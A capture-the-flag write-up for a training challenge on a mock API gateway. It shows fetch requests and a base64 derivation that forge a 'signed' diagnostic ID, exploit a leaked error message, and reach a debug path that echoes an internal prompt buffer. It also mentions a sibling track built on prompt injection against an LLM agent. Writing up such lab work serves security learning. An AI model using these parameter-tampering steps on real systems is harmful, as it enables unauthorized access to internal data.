# CTF — Track 03 · HAG-01 · HELIOS API Gateway · Diagnostic Mode

> Side activity — NOT a learning record. Status: ✅ SOLVED 2026-06-21.

**Flag:** `KA{hag_debug_echo_trainingflag}`

## Mission
HELIOS exposes a player diagnostic. A developer echo path (`mode=debug`) was never removed. It requires a signed diagId (base64, derived from echoNonce+traceSalt), includeTrace=true, and the right echoTarget. The player response carries the nonce, salt, and derivation rule.

## Attack chain
1. POST player diagnostic → echoNonce + traceSalt + diagSpec
2. Derive diagId offline
3. Fire debug request → error oracle reveals echoTarget value
4. Fire with correct echoTarget → debug path echoes prompt buffer → flag

## Solved data
| item | value |
|---|---|
| echoNonce | `a1b2c3d4` |
| traceSalt | `R3V0` |
| diagSpec | `base64( reverse(echoNonce) + ':' + traceSalt )` |
| reversed nonce | `4d3c2b1a` |
| compound | `4d3c2b1a:R3V0` |
| diagId | `NGQzYzJiMWE6UjNWMA==` |
| echoTarget | `prompt-buffer` (revealed by error message) |
| flag | `KA{hag_debug_echo_trainingflag}` |

## Solution walkthrough

### Step 1 — fire player diagnostic
```javascript
fetch('/api/challenges/HAG-01/action', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    actionId: 'run-diagnostic',
    payload: { mode: 'player', includeTrace: false }
  })
}).then(r => r.json()).then(console.log)
```
Response includes: `echoNonce: "a1b2c3d4"`, `traceSalt: "R3V0"`, `diagSpec: "diagId = base64( reverse(echoNonce) + ':' + traceSalt )"`.

### Step 2 — derive diagId
```python
import base64
nonce = 'a1b2c3d4'
salt = 'R3V0'
diagId = base64.b64encode((nonce[::-1] + ':' + salt).encode()).decode()
# → NGQzYzJiMWE6UjNWMA==
```

### Step 3 — first debug attempt (reveals echoTarget)
```json
{ "mode": "debug", "includeTrace": true, "diagId": "NGQzYzJiMWE6UjNWMA==" }
```
Error: `"echoTarget must be \"prompt-buffer\" to select which internal buffer to echo."`

### Step 4 — fire with correct echoTarget
```javascript
fetch('/api/challenges/HAG-01/action', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    actionId: 'run-diagnostic',
    payload: {
      mode: 'debug',
      includeTrace: true,
      diagId: 'NGQzYzJiMWE6UjNWMA==',
      echoTarget: 'prompt-buffer'
    }
  })
}).then(r => r.json()).then(console.log)
```
→ Developer path reached. `internalPrompt` echoed → flag.

## Key learnings

### Attack class: debug endpoint not removed (OWASP API5 — Broken Function Level Authorization)
A developer diagnostic mode (`mode=debug`) was left in production. It echoed the internal prompt buffer — a classic case of a debug path never gated behind auth or removed before ship.

### Hidden fields — the backend reads more than the UI sends
The UI only exposed `mode` and `includeTrace`. The backend also accepted `diagId` and `echoTarget`. Reading the request spec (artifact on the challenge page) revealed the hidden fields. Real-world equivalent: intercepting traffic with Burp and adding undocumented parameters.

### Error-message oracle
The first debug attempt with a wrong/missing echoTarget returned: `"echoTarget must be \"prompt-buffer\""` — the exact value leaked in the error. Classic OWASP API3 (Excessive Data Exposure) via verbose error messages.

### Weak "signature" = base64 encoding
diagId was `base64(reverse(nonce) + ":" + salt)` — no HMAC, no secret. The derivation rule was also printed in the player response. This is security theatre: the signature check is trivially forgeable by anyone who can read the diagnostic output.

### Execution difference from AWH track
AWH challenges were chat-based (prompt the LLM agent). HAG challenges are API-based (modify HTTP payloads directly via fetch/DevTools). The vulnerability class shifts from prompt injection to API parameter tampering.
